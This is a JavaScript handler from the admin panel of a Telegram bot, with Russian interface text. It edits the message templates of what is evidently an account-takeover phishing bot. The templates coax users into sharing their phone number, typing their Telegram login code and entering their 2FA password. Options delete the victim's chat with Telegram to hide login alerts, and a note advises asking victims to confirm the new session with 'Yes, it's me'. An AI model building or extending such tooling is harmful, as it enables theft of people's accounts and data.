import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import states from "../../states.js";
import template from "../../../database/schemas/template.js";
import botModel from "../../../database/schemas/bot.js";

export default {
    name: "editt",
    async exec(query, [id, action, confirm]) {
        const t = await template.findOne({ id }) || await dtemplate.findOne({ id });
        let inline_keyboard = query.message.reply_markup.inline_keyboard;
        if (!t) return await bot.answerCallbackQuery(query.id, {
            text: "❌ Шаблон не найден"
        });

        if (action === 'delete') {
            if (!confirm) {
                return await bot.editMessageCaption(query, `*❔ Вы точно хотите удалить шаблон ${t.name}*`, {
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: '🗑 Удалить',
                                    callback_data: `editt:${id}:delete:true`
                                },
                            ],
                            [
                                {
                                    text: '🔙 Назад',
                                    callback_data: await template.findOne({ id }) ? `t:${id}` : `ts:${id}`
                                }
                            ]
                        ]
                    },
                    message_id: query.message.message_id,
                    chat_id: query.message.chat.id
                })
            }
            if (await botModel.findOne({ template: id })) {
                return await bot.sendMessage(query.from.id, `*❌ Шаблон не может быть удален, так как он привязан к боту*`, {
                    parse_mode: "Markdown"
                });
            }
            await template.deleteOne({ id });
            await dtemplate.deleteOne({ id });
            return await bot.editMessageCaption(query, `*✅ Шаблон <code>${t.name}</code> успешно удален*`, {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '🔙 Назад',
                                callback_data: `templates`
                            }
                        ]
                    ]
                },
                message_id: query.message.message_id,
                chat_id: query.message.chat.id
            })
        }
        if(action === 'deleteTelegram' || action === 'deleteBot' || action === 'mailingUnauth') {
            const templateDoc = await template.findOne({ id });
            let fieldValue;
            let buttonConfig;

            switch(action) {
                case 'deleteTelegram':
                    fieldValue = !templateDoc.deleteTelegram;
                    buttonConfig = {
                        index: [10, 0],
                        text: `🔇 Удалить чат с telegram ${fieldValue ? '🟢' : '🔴'}`,
                        field: 'deleteTelegram'
                    };
                    break;
                case 'deleteBot':
                    fieldValue = !templateDoc.deleteBot;
                    buttonConfig = {
                        index: [9, 0],
                        text: `🤖 Удалить чат с ботом ${fieldValue ? '🟢' : '🔴'}`,
                        field: 'deleteBot'
                    };
                    break;
                case 'mailingUnauth':
                    fieldValue = !templateDoc.mailingUnauth;
                    buttonConfig = {
                        index: [8, 0],
                        text: `🎉 Сообщение после авторизации ${fieldValue ? '🟢' : '🔴'}`,
                        field: 'mailingUnauth'
                    };
                    break;
            }

            // Обновляем значение в базе данных
            await template.findOneAndUpdate(
                { id }, 
                { [buttonConfig.field]: fieldValue },
                { new: true }
            );

           
            inline_keyboard[buttonConfig.index[0]][buttonConfig.index[1]] = {
                text: buttonConfig.text,
                callback_data: `editt:${id}:${action}`
            };
            
            return await bot.editMessageReplyMarkup({ inline_keyboard }, {
                message_id: query.message.message_id,
                chat_id: query.message.chat.id
            });
        }

        states.set(query.from.id, { action: 'editt', args: [id, action] })
        const message = {
            start: {
                title: '👋🏻 Вступительное сообщение после команды /start',
                description: 'Первое сообщение которое видит пользователь после нажатия кнопки /start. Ключевой смысл мотивировать пользователя поделится контактом и пройти авторизацию.',
                note: 'Вы можете форматировать текст и вставлять ссылки. Так же это сообщение поддерживает медиафайлы.',
                value: t[action]
            },
            contact: {
                title: '👤 Текст кнопки по которой пользователь делится своим контактом',
                description: 'Кнопка находится в нижней части бота, по ней пользователь поделится контактом для отправления кода.',
                note: 'Вводите текст без форматирование и медиафайлов.',
                value: t[action]
            },
            wait: {
                title: '⌛️ Сообщение во время ожидания кода',
                description: 'Пользователь поделился номером телефона, ждёт код.',
                value: t[action]
            },
            code: {
                title: '📲 Сообщение ввода кода',
                description: 'Появляется клавиатура для ввода кода и текст с призывом к действию пользователя.',
                value: t[action]
            },
            NaNCode: {
                title: '⌨️ Сообщение о вводе кода в чате',
                description: 'Если пользователь будет вводить код не на клавиатуре, а в чате отправляется данное сообщение.',
                value: t[action]
            },
            wrongCode: {
                title: '❌ Сообщение когда пользователь ввел неверный код',
                description: 'Пользователь ввел неверно код. 5 секунд он ждёт. (до 3-х попыток)',
                value: t[action]
            },
            timeout: {
                title: '♻️ Сообщение проверки кода',
                description: 'Пользователь ввел код и ждёт проверки.',
                value: t[action]
            },
            error: {
                title: '🚫 Сообщение при ошибке отправки кода',
                description: 'В менеджере бывают разные баги. Так что просим ждать пользователя 30 секунд для повторного кода.',
                value: t[action]
            },
            auth: {
                title: '🎉 Сообщение после авторизации',
                description: 'Сообщение приходит пользователю после того как он прошел авторизацию.',
                note: 'Рекомендуем попросить пользователя нажать "Да, это я" в списке чатов.',
                value: t[action]
            },
            password: {
                title: '🔐 Сообщение при вводе пароля (2FA)',
                description: 'Пользователь вводит пароль от аккаунта.',
                value: t[action]
            },
            wrongPassword: {
                title: '🔒 Сообщение если пользователь ввел неверный пароль (2FA)',
                description: 'Отправляется пользователю в случае неверного пароля от 2FA. (дается 3 попытки)',
                value: t[action]
            },
            mailing1h: {
                title: '📣 Авто.Рассылка',
                description: 'Сообщения отправляются автоматически спустя 5/10/30/60/120 минут. Выберите формант рассылки пользователям.',
                value: t[action]
            },
            button: {
                title: '🔘 Текст кнопки',
                description: 'Текст, который отображается на кнопке.',
                value: t[action]
            }
        }

        const formatMessage = (msg) => {
            return `<b>${msg.title}</b>\n\n<i>❔ ${msg.description}</i>\n\n<b>Значение сейчас:</b>\n${msg.value}${msg.note ? `\n\n<i>❕ ${msg.note}</i>` : '\n\n<b>Введите новое значение:</b>'}`
        }
        await bot.editMessageCaption(query, formatMessage(message[action]), {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: await template.findOne({ id }) ? `t:${id}` : `ts:${id}`
                        }
                    ]
                ]
            },
            message_id: query.message.message_id,
            chat_id: query.message.chat.id
        })
    }
}